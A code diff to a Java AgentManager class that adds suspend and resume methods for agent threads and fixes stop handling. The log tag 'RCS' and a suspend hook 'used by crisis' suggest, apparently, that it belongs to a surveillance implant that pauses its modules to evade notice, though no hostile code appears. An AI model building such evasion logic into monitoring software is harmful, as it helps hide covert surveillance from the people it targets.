@@ -28,7 +28,6 @@ public class AgentManager extends Manager<AgentBase> {
 	/** The singleton. */
 	private volatile static AgentManager singleton;
 
-
 	/**
 	 * Self.
 	 * 
@@ -149,7 +148,7 @@ public class AgentManager extends Manager<AgentBase> {
 
 		while (it.hasNext()) {
 			final Integer key = it.next();
-			 start(key);
+			start(key);
 		}
 
 		return true;
@@ -235,6 +234,7 @@ public class AgentManager extends Manager<AgentBase> {
 		}
 
 		a.stopThread();
+		running.remove(key);
 
 		final Thread t = threads.get(a);
 		if (t != null) {
@@ -248,10 +248,58 @@ public class AgentManager extends Manager<AgentBase> {
 		threads.remove(a);
 	}
 
+	/**
+	 * Suspend an agent, used by crisis
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void suspend(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d("RCS", "Agent " + key + " not present");
+			return;
+		}
 
+		// suspending a thread implies a stop
+		a.suspend();
 
+		final Thread t = threads.get(a);
+		if (t != null) {
+			try {
+				t.join();
+			} catch (final InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		threads.remove(a);
 
+	}
 
+	/**
+	 * Resume an agent, only if suspended
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void resume(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d("RCS", "Agent " + key + " not present");
+			return;
+		}
 
+		if (a.isSuspended()) {
+			// this clean the suspendend status
+			a.resume();
+
+			// start a new thread and restart the loop.
+			final Thread t = new Thread(a);
+			threads.put(a, t);
+			t.start();
+
+		}
+	}
 
 }
